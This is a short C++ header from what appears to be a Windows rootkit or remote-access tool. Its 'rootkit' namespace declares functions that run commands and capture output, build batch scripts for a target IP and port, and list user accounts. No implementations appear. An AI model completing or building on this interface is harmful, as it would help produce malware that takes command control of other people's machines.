
#pragma once

#include <iostream>
#include <variant>
#include <vector>

enum class FormatStatus {
	Success, // 성공
	Failed, // 실패
	Lost // 패킷 손실
};

struct FormatResult {
	std::string formatted;
	FormatStatus status;

	bool is_ok() const { return status == FormatStatus::Success; }
	bool is_lost() const { return status == FormatStatus::Lost; }
};


namespace rootkit {

	std::string run_cmd_with_output(const std::string& cmd);

	std::string to_cmd_script(const std::string& cmd);
	
	FormatResult exploit_bat_formatter(std::string& ip, unsigned short port,const std::string& str);

	std::vector<std::string> get_username_list();
	std::vector<std::string> get_username_list_not_admin();
	
	std::string get_program_host_username();
}